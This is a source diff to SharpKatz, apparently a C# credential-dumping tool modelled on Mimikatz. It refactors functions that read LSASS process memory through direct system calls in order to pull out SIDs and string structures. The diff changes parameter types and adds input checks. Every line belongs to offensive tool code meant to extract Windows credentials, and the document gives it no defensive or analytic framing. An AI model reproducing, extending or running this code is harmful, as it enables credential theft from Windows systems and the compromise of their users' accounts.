@@ -120,12 +120,18 @@ namespace SharpKatz
             return GetIntPtr( hLsass,  msvMem, listSignOffset, listOffset);
         }
 
-        public static byte[] ReadFromLsass(ref IntPtr hLsass, IntPtr addr, ulong bytesToRead)
+        public static byte[] ReadFromLsass(ref IntPtr hLsass, IntPtr addr, long bytesToRead)
         {
-            int bytesRead = 0;
-            byte[] bytev = new byte[Convert.ToInt32(bytesToRead)];
+            if (bytesToRead < 0)
+                throw new ArgumentException($"{bytesToRead} is not a valid number of bytes to read");
 
-            NTSTATUS status = SysCall.NtReadVirtualMemory10(hLsass, addr, bytev, Convert.ToInt32(bytesToRead), bytesRead);
+            if (bytesToRead == 0)
+                return Array.Empty<byte>();
+
+            int bytesRead = 0;
+            byte[] bytev = new byte[bytesToRead];
+
+            NTSTATUS status = SysCall.NtReadVirtualMemory10(hLsass, addr, bytev, (int)bytesToRead, bytesRead);
 
             return bytev;
         }
@@ -158,7 +164,7 @@ namespace SharpKatz
 
             sizeSid = 4 * nbAuth + 6 + 1 + 1;
 
-            byte[] sid_b = Utility.ReadFromLsass(ref hLsass, new IntPtr(pSidInt), (ulong)sizeSid);
+            byte[] sid_b = Utility.ReadFromLsass(ref hLsass, new IntPtr(pSidInt), sizeSid);
 
             return sid_b;
         }
@@ -175,7 +181,7 @@ namespace SharpKatz
         {
             UNICODE_STRING str;
             
-            byte[] strBytes = Utility.ReadFromLsass(ref hLsass, addr, Convert.ToUInt64(Marshal.SizeOf(typeof(UNICODE_STRING))));
+            byte[] strBytes = Utility.ReadFromLsass(ref hLsass, addr, Marshal.SizeOf(typeof(UNICODE_STRING)));
             str = ReadStruct<UNICODE_STRING>(strBytes);
 
             return str;
